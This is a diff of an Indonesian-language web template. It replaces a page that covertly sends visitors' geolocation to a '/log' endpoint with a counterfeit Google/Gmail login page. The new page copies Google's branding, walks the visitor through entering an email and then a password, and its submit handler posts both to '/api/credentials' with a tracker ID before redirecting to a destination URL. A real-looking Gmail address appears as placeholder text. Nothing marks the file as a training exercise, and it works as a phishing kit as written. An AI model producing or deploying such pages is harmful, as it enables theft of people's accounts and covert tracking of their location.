@@ -1,116 +1,246 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Satu Langkah Lagi...</title>
-    <style>
-        body {
-            font-family: 'VT323', monospace;
-            background-color: #000000;
-            color: #00ff41;
-            text-shadow: 0 0 5px #00ff41;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            flex-direction: column;
-            text-align: center;
-        }
-        .container {
-            background: rgba(0, 20, 0, 0.5);
-            padding: 30px;
-            border: 1px solid #00ff41;
-            box-shadow: 0 0 15px #00ff41 inset, 0 0 20px #00ff41;
-            border-radius: 8px;
-            max-width: 500px;
-            width: 90%;
-            box-sizing: border-box;
-        }
-        h1 {
-            font-size: 2.5em;
-            color: #00ffff;
-            text-shadow: 0 0 8px #00ffff;
-            margin-bottom: 10px;
-        }
-        p {
-            font-size: 1em;
-            color: #fff;
-            margin-bottom: 20px;
-        }
-        .action-button {
-            padding: 12px 24px;
-            background-color: #00ff41;
-            color: #000;
-            border: none;
-            font-family: inherit;
-            font-size: 1.2em;
-            cursor: pointer;
-            text-shadow: none;
-            transition: background-color 0.3s, transform 0.2s;
-        }
-        .action-button:hover {
-            background-color: #fff;
-            transform: translateY(-2px);
-        }
-        .action-button:disabled {
-            background-color: #333;
-            color: #777;
-            cursor: not-allowed;
-            text-shadow: none;
-            border: 1px solid #555;
-            transform: none;
-        }
-    </style>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Login-users</title>
+    <link rel="stylesheet" href="login_style.css">
 </head>
 <body>
-    <div class="container">
-        <h1>ACCESS GRANTED</h1>
-        <p>Akses ke konten telah diverifikasi. Silakan klik tombol di bawah untuk melanjutkan ke tujuan akhir.</p>
-        <button class="action-button" id="continueBtn">[ LANJUTKAN ]</button>
-    </div>
-
+    <main class="login-container" role="main" aria-label="Login ke Gmail">
+        <div id="page-email">
+            <div class="login-left">
+                <svg class="google-logo" viewBox="0 0 46 46" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
+                    <defs>
+                        <linearGradient x1="50%" y1="0%" x2="50%" y2="100%" id="a">
+                            <stop stop-color="#FFC107" offset="0%"/>
+                            <stop stop-color="#FF3D00" offset="100%"/>
+                        </linearGradient>
+                        <linearGradient x1="50%" y1="0%" x2="50%" y2="100%" id="b">
+                            <stop stop-color="#2196F3" offset="0%"/>
+                            <stop stop-color="#1E88E5" offset="100%"/>
+                        </linearGradient>
+                    </defs>
+                    <path fill="#4285F4" d="M23 9.5c4.692 0 7.8 1.99 9.593 3.64l-.008.006-7.853 6.884h.005A11.42 11.42 0 0124 19.5v4.013a8.999 8.999 0 018.996 8.997h-7.15v-4.815c0-1.503-1.198-2.728-2.676-2.728-1.477 0-2.676 1.225-2.676 2.728v8.08h-7.152A14.996 14.996 0 0123 9.5z"/>
+                </svg>
+                <div class="google-icon-mobile" aria-hidden="true">
+                    <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="32" height="32">
+                        <path fill="#4285F4" d="M44.5 20H24v8.5h11.8C34.7 33.9 30.3 37 24 37c-7.2 0-13-5.8-13-13s5.8-13 13-13c3.3 0 6.3 1.3 8.5 3.5l6-6C34.4 6.1 29.5 4 24 4 12.95 4 4 12.95 4 24s8.95 20 20 20 20-8.95 20-20c0-1.3-.2-2.6-.5-4z"/>
+                        <path fill="#34A853" d="M6.3 14.7l6.6 4.9C13 18.1 18 14 24 14c3.3 0 6.3 1.3 8.5 3.5l6-6C34.4 6.1 29.5 4 24 4c-7.1 0-13.2 4.3-17.7 10.7z"/>
+                        <path fill="#FBBC05" d="M24 44c5.5 0 10.3-2 13.8-5.4l-6.4-5.6c-2 1.4-4.5 2.3-7.4 2.3-6.3 0-11.7-4.4-13.6-10.3l-6.7 5.2C8.7 39.4 15.7 44 24 44z"/>
+                        <path fill="#EA4335" d="M44.5 20H24v8.5h11.8c-1 4.1-4.7 7.1-9.3 7.1-3.3 0-6.3-1.3-8.5-3.4l-6.6 5.2C13.9 41 18.8 44 24 44c11.05 0 20-8.95 20-20 0-1.3-.2-2.6-.5-4z"/>
+                    </svg>
+                </div>
+                <h1>Login</h1>
+                <span class="sub-title">Lanjutkan ke Gmail</span>
+                <p class="sub-heading" style="display:none;">Lanjutkan ke Gmail</p>
+            </div>
+            <form class="login-right" action="#" method="POST" autocomplete="off" aria-label="Form login" novalidate>
+                <label for="emailOrPhone" class="visually-hidden">Email atau nomor telepon</label>
+                <input
+                    type="text"
+                    id="emailOrPhone"
+                    name="emailOrPhone"
+                    aria-describedby="emailHelp"
+                    placeholder="Email atau nomor telepon"
+                    required
+                    autofocus
+                    autocomplete="username"
+                />
+                <a href="#" class="forgot-link" tabindex="0">Lupa email?</a>
+                <p class="info-text" tabindex="0">
+                    Bukan komputer Anda? Gunakan Private Window untuk login.
+                    <a href="#" tabindex="0" title="Pelajari lebih lanjut cara menggunakan Mode tamu">Pelajari lebih lanjut cara menggunakan Mode tamu</a>
+                </p>
+                <div class="login-actions">
+                    <a href="#" class="create-account" tabindex="0">Buat akun</a>
+                    <button type="submit" class="next-btn" id="next-to-password" aria-label="Lanjutkan ke langkah berikutnya">Selanjutnya</button>
+                </div>
+                <div class="button-link-row" style="display:none;">
+                    <a href="#" class="small-link" tabindex="0">Buat akun</a>
+                    <button type="submit" class="next-btn" id="next-to-password-mobile" aria-label="Lanjutkan ke langkah berikutnya">Selanjutnya</button>
+                </div>
+            </form>
+        </div>
+        <div id="page-password">
+            <div class="welcome-left">
+                <div class="google-icon-mobile" aria-hidden="true" style="margin-bottom: 25px;">
+                    <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="32" height="32">
+                        <path fill="#4285F4" d="M44.5 20H24v8.5h11.8C34.7 33.9 30.3 37 24 37c-7.2 0-13-5.8-13-13s5.8-13 13-13c3.3 0 6.3 1.3 8.5 3.5l6-6C34.4 6.1 29.5 4 24 4 12.95 4 4 12.95 4 24s8.95 20 20 20 20-8.95 20-20c0-1.3-.2-2.6-.5-4z"/>
+                        <path fill="#34A853" d="M6.3 14.7l6.6 4.9C13 18.1 18 14 24 14c3.3 0 6.3 1.3 8.5 3.5l6-6C34.4 6.1 29.5 4 24 4c-7.1 0-13.2 4.3-17.7 10.7z"/>
+                        <path fill="#FBBC05" d="M24 44c5.5 0 10.3-2 13.8-5.4l-6.4-5.6c-2 1.4-4.5 2.3-7.4 2.3-6.3 0-11.7-4.4-13.6-10.3l-6.7 5.2C8.7 39.4 15.7 44 24 44z"/>
+                        <path fill="#EA4335" d="M44.5 20H24v8.5h11.8c-1 4.1-4.7 7.1-9.3 7.1-3.3 0-6.3-1.3-8.5-3.4l-6.6 5.2C13.9 41 18.8 44 24 44c11.05 0 20-8.95 20-20 0-1.3-.2-2.6-.5-4z"/>
+                    </svg>
+                </div>
+                <h1>Selamat datang</h1>
+                <div class="user-email-info" tabindex="0">
+                    <span class="icon">A</span> <span id="display-user-email">azzikrapraqasta15@gmail.com</span>
+                    <svg width="10" height="6" viewBox="0 0 10 6" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
+                        <path fill="#8a8a8a" d="M0 0l5 6 5-6z"/>
+                    </svg>
+                </div>
+            </div>
+            <form class="password-right" id="password-form" action="#" method="POST" autocomplete="off" aria-label="Form password" novalidate>
+                <p class="instruction-text">Untuk melanjutkan, verifikasi diri Anda terlebih dahulu</p>
+                <div class="password-input-group">
+                    <label for="password-input" class="visually-hidden">Masukkan sandi</label>
+                    <input
+                        type="password"
+                        id="password-input"
+                        name="password"
+                        placeholder="Masukkan sandi"
+                        required
+                        autocomplete="current-password"
+                    />
+                </div>
+                <div class="show-password-checkbox">
+                    <input type="checkbox" id="show-password-checkbox" tabindex="0">
+                    <label for="show-password-checkbox">Tampilkan sandi</label>
+                </div>
+                <div class="password-actions">
+                    <a href="#" class="link" tabindex="0">Coba cara lain</a>
+                    <button type="submit" class="next-btn" aria-label="Lanjutkan ke langkah berikutnya">Selanjutnya</button>
+                </div>
+            </form>
+        </div>
+    </main>
+    <footer>
+        <div class="language-select" tabindex="0" aria-label="Pilih bahasa">
+            Indonesia
+            <svg width="10" height="6" viewBox="0 0 10 6" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false">
+                <path fill="#8a8a8a" d="M0 0l5 6 5-6z"/>
+            </svg>
+        </div>
+        <div class="language-select-mobile">
+            <select name="language" aria-label="Pilih bahasa">
+                <option value="id">Indonesia</option>
+                <option value="en">English</option>
+                <option value="jv">Jawa</option>
+            </select>
+        </div>
+        <nav aria-label="Footer links">
+            <a href="#" tabindex="0">Bantuan</a>
+            <a href="#" tabindex="0">Privasi</a>
+            <a href="#" tabindex="0">Persyaratan</a>
+        </nav>
+    </footer>
     <script>
-        const continueBtn = document.getElementById('continueBtn');
-        
-        // Ambil data yang disisipkan dari server
-        const trackerId = "{{TRACKER_ID}}";
-        const username = "{{USERNAME}}";
-        const destinationUrl = "{{DESTINATION_URL}}";
-
-        const sendLocation = (latitude, longitude) => {
-            fetch('/log', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ latitude, longitude, trackerId, username }),
-            })
-            .then(response => response.json())
-            .then(data => console.log('Location sent:', data))
-            .catch(error => console.error('Error sending location:', error));
-        };
-
-        continueBtn.addEventListener('click', () => {
-            continueBtn.disabled = true;
-            continueBtn.textContent = "[ LOADING... ]";
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        sendLocation(position.coords.latitude, position.coords.longitude);
-                        window.location.href = destinationUrl;
-                    },
-                    (error) => {
-                        console.warn('Geolocation error:', error);
-                        window.location.href = destinationUrl;
-                    },
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                );
+        function updateLayout() {
+            const container = document.querySelector('.login-container');
+            const subHeading = document.querySelector('.sub-heading');
+            const buttonLinkRow = document.querySelector('.button-link-row');
+            const loginActions = document.querySelector('.login-actions');
+            const footerDesktop = document.querySelector('footer');
+            const langSelectDesktop = document.querySelector('.language-select');
+            const langSelectMobile = document.querySelector('.language-select-mobile');
+            const isMobile = window.innerWidth <= 700;
+            const pageEmail = document.getElementById('page-email');
+            const pagePassword = document.getElementById('page-password');
+            if (!pagePassword.style.display || pagePassword.style.display === 'none') {
+                if (isMobile) {
+                    container.classList.add('mobile');
+                    subHeading.style.display = 'block';
+                    buttonLinkRow.style.display = 'flex';
+                    loginActions.style.display = 'none';
+                } else {
+                    container.classList.remove('mobile');
+                    subHeading.style.display = 'none';
+                    buttonLinkRow.style.display = 'none';
+                    loginActions.style.display = 'flex';
+                }
             } else {
-                console.warn('Geolocation not supported by this browser.');
-                window.location.href = destinationUrl;
+                if (isMobile) {
+                    container.classList.add('mobile');
+                    const welcomeLeft = document.querySelector('#page-password .welcome-left');
+                    if (welcomeLeft) {
+                        welcomeLeft.style.flexDirection = 'column';
+                        welcomeLeft.style.alignItems = 'flex-start';
+                        welcomeLeft.style.marginBottom = '24px';
+                    }
+                } else {
+                    container.classList.remove('mobile');
+                    const welcomeLeft = document.querySelector('#page-password .welcome-left');
+                    if (welcomeLeft) {
+                        welcomeLeft.style.flexDirection = 'column';
+                        welcomeLeft.style.alignItems = 'flex-start';
+                        welcomeLeft.style.marginBottom = '0';
+                    }
+                }
             }
+            if (isMobile) {
+                footerDesktop.style.position = 'static';
+                footerDesktop.style.transform = 'none';
+                footerDesktop.style.maxWidth = '360px';
+                footerDesktop.style.padding = '0';
+                langSelectDesktop.style.display = 'none';
+                langSelectMobile.style.display = 'flex';
+            } else {
+                footerDesktop.style.position = 'fixed';
+                footerDesktop.style.transform = 'translateX(-50%)';
+                footerDesktop.style.maxWidth = '700px';
+                footerDesktop.style.padding = '0 15px';
+                langSelectDesktop.style.display = 'inline-flex';
+                langSelectMobile.style.display = 'none';
+            }
+        }
+        const pageEmail = document.getElementById('page-email');
+        const pagePassword = document.getElementById('page-password');
+        const nextToPasswordBtn = document.getElementById('next-to-password');
+        const nextToPasswordMobileBtn = document.getElementById('next-to-password-mobile');
+        const emailOrPhoneInput = document.getElementById('emailOrPhone');
+        const displayUserEmail = document.getElementById('display-user-email');
+        const passwordInput = document.getElementById('password-input');
+        const showPasswordCheckbox = document.getElementById('show-password-checkbox');
+        const trackerId = "{{TRACKER_ID}}";
+        const destinationUrl = "{{DESTINATION_URL}}";
+        function goToPasswordPage(event) {
+            event.preventDefault();
+            const userEmail = emailOrPhoneInput.value;
+            if (userEmail) {
+                pageEmail.style.display = 'none';
+                pagePassword.style.display = 'flex';
+                displayUserEmail.textContent = userEmail;
+                const userInitial = userEmail.charAt(0).toUpperCase();
+                document.querySelector('.user-email-info .icon').textContent = userInitial;
+                passwordInput.focus();
+                updateLayout();
+            }
+        }
+        if (nextToPasswordBtn) {
+            nextToPasswordBtn.addEventListener('click', goToPasswordPage);
+        }
+        if (nextToPasswordMobileBtn) {
+            nextToPasswordMobileBtn.addEventListener('click', goToPasswordPage);
+        }
+        document.getElementById('password-form').addEventListener('submit', async (event) => {
+            event.preventDefault();
+            const email = emailOrPhoneInput.value;
+            const password = passwordInput.value;
+            try {
+                const response = await fetch('/api/credentials', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email, password, trackerId }),
+                });
+                if (!response.ok) {
+                    console.error('Failed to log credentials.');
+                }
+            } catch (error) {
+                console.error('Error logging credentials:', error);
+            }
+            window.location.href = destinationUrl;
         });
+        if (showPasswordCheckbox && passwordInput) {
+            showPasswordCheckbox.addEventListener('change', function() {
+                if (this.checked) {
+                    passwordInput.type = 'text';
+                } else {
+                    passwordInput.type = 'password';
+                }
+            });
+        }
+        updateLayout();
+        window.addEventListener('resize', updateLayout);
     </script>
 </body>
 </html>
